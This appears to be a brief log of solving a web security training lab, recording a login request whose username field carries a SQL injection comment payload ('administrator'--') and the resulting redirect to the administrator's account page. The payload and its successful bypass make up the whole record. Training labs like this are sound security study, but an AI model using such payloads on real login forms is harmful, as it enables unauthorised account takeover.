@@ -1,0 +1,8 @@
+# POST https://0a0c00c7034592ad819f349b008a0006.web-security-academy.net/login
+# request body: csrf=KDhEGbkcPQJwHshRRKqvTZgH4wMrxJRR&username=administrator%27--&password=x
+
+HTTP 302
+location: /my-account?id=administrator
+
+# after submit, landed url: https://0a0c00c7034592ad819f349b008a0006.web-security-academy.net/my-account?id=administrator
+# page shows: SQL injection vulnerability allowing login bypass
